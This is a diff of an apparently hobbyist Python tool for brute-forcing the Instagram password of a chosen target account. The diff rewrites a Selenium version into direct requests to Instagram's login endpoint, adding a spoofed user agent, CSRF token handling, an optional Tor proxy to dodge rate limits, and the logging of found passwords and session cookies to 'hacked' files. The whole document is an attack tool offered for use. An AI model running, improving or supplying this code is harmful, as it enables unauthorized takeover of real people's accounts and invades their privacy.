@@ -1,52 +1,100 @@
 #!/usr/bin/python3
+import sys
 import time
-import random
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.firefox.options import Options
+import json
+import requests
+import threading
+from datetime import datetime
+from fake_user_agents import fake_agent
 
-opt = Options()
-opt.headless = True
+instagram_url = "https://www.instagram.com/accounts/login/"
+instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"
 
-target = input("TARGET USERNAME ~> ")
-path = input("PATH TO WORDLIST.txt ~> ")
-save = input("SAVE ONLY HACKED OR ALL TRYED PASSWORDS [o/a/n] ~> ")
+payload = {
+    "queryParams" : {},
+    "optIntoOneTap" : "false"
+}
 
-instagram = 'https://www.instagram.com'
-insta_login = 'https://www.instagram.com/accounts/login/'
+login_header = {
+    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+    "X-Requested-With" : "XMLHttpRequest",
+    "Referer" : instagram_url
+}
+# adding local tor proxy "sudo systemctl enable tor"
+proxy = {
+    'http':  'socks5://localhost:9050',
+    'https': 'socks5://localhost:9050',
+}
 
-web = webdriver.Firefox(options=opt)
-print(f'[+] GOING TO ~> {insta_login}...')
-web.get(insta_login)
-time.sleep(2)
+cookie_request = requests.get(instagram_url)
+csrf = cookie_request.cookies['csrftoken']
+login_header.update({"x-csrftoken" : csrf})
 
-login = web.find_element(By.NAME, "username")
-login.send_keys(target)
-print(f'[+] TYPING TARGET USERNAME ~> {target}...')
-time.sleep(2)
+target = input("target username: ")
+payload.update({"username" : target})
+check_request = requests.get(f"https://www.instagram.com/{target}")#,proxies=proxy)
+if check_request.status_code != 200:
+    print(check_request.status_code)
+    print("target username not found")
+    exit()
+elif check_request.url == f"{instagram_url}?next=/{target}/":
+    #TOOD add proxy server 
+    print(check_request.url)
+    print("changing proxy server please wait")
+    #exit()
 
+wordlist = input("wordlist path: ")
 try:
-  bruteforce = open(path, 'r')
+    bruteforce = open(wordlist, "r")
 except FileNotFoundError:
-  print(f"[-] {path} wordlist.txt not found")
-  web.quit()
-  exit()
+    print("wordlist path noth found")
+    exit()
+save = input("save tryed passwords?: ")
 
-for brute in bruteforce:
-  password = web.find_element(By.NAME, 'password')
-  brute = brute.strip()
-  if save == 'a':
-    tryed_password = open(f'tryed/{target}.txt', 'a')
-    tryed_password.write(f'{brute}\n')
-  try:
-    password.send_keys(brute, Keys.RETURN)
-    time.sleep(3.5)
-    password.clear()
-    print(f"[-] TRYING PASSWORD ~> {brute}")
-  except:
-    with open(f'hacked/{target}.txt', 'w') as hacked_password:
-      hacked_password.write(brute)
-    print(f'[+] PASSWORD WAS FOUND ~> {brute}')
-    web.quit()
-    break
+def main(proxy):
+    tryes = 0
+    for hack in bruteforce:
+        tryes += 1
+        hack = hack.strip()
+        # TOOD add change proxy server after every 10 tryes
+        payload.update({
+            "enc_password" : f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
+        })
+
+        if proxy == "tor":
+            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
+        elif proxy == "default":
+            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
+        else:
+            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
+
+        print(f"[-] trying password: {hack}")
+        if save == "a":
+            with open(f"tryed/{target}", "a") as tryed:
+                tryed.write(hack)
+        time.sleep(5)
+        hack_data = json.loads(hack_request.text)
+        print(hack_data)
+
+        if "authenticated" in hack_data:
+            if hack_data["authenticated"]:
+                print(f"[+] password founded: {hack}")
+                cookies = hack_request.cookies
+                cookie_jar = cookies.get_dict()
+                csrf_token = cookie_jar['csrftoken']
+                print("csrf_token: ", csrf_token)
+                session_id = cookie_jar['sessionid']
+                print("session_id: ", session_id)
+                with open(f"hacked/{target}", "a") as hacked:
+                    hacked.write(hack)
+                break
+
+        elif "message" in hack_data:
+            if hack_data["message"] == "checkpoint_required":
+                print(f"[+] password founded: {hack}")
+                with open(f"hacked/{target}", "a") as hacked:
+                    hacked.write(hack)
+                break
+
+if __name__ == "__main__":
+    main(sys.argv[1])
